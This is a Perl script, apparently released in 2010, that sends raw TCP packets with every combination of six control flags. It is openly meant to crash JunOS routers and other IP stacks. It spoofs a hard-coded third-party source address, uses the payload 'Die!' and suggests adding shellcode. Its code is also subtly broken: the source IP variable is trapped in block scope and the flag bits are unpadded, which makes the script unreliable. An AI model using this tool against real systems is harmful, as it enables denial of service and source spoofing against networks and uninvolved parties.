#!/usr/bin/perl
#
# 2^6 TCP Control Bit Fuzzer (No ECN or CWR)
#
# This coded was written originally as a control bit fuzzer for the JunOS 3-9 crash mentioned
# in PSN-2010-01-623 and http://www.securityfocus.com/news/11571 however it will also be useful
# in fuzzing future IP stacks, such as userland IP stacks or embedded systems.
#
# Originally it was was going to be the full 2^8, however Net::RawIP does't support the ECE
# or the CWR bit, so I've got a Metasploit auxillery in the works to cover the full 2^8.
#
# I've left the ece/cwr portions commented out, so if in the future Net::RawIP supports these bits,
# all you need to do is uncomment them and change the 65 in the for loop to a 256.
#
# Written by Shadow, 1/08/2010
# ShadowHatesYou @ irc.freenode.net #remote-exploit

use Net::RawIP;

# Set the packet's payload. Shellcode could go here....
my $data = "Die!";

if ($ARGV[1] eq '') { print "Usage: ./" . $0 . " <ip> <port> <optional
sourceip>\n"; exit(0); }
if ($ARGV[2] eq '') { my $src_ip = "72.52.4.181" } else { my $src_ip =
$ARGV[2] }

my $packet = new Net::RawIP({tcp=>{}});
$packet->set({
	ip => {
		saddr => $src_ip,
		daddr => $ARGV[0],
		id => 666
	}
});
# Build packet $i with TCP control options $i
for (my $i=0; $i < 64; $i++) {
	my $packet = new Net::RawIP({tcp=>{}});
	# Get our options
	my $binary = sprintf("%b", $i);
	my @bits = split(//, $binary);
	# Set the source and destination IP	
	$packet->set({		
		tcp => {
			source => $ARGV[1],
			dest => $ARGV[1],
			data => $data,
			syn => @bits[0],
			ack => @bits[1],
			fin => @bits[2],
			rst => @bits[3],
			psh => @bits[4],
			urg => @bits[5],
#			cwr => @bits[6],
#			ece => @bits[7]
		}
	});
	# Packets away.
	print "Sending packet "	. ($i + 1) . " to " . $ARGV[0] . ":" .
$ARGV[1] . "	Bits: @bits\n";
	$packet->send;
}
exit(0);

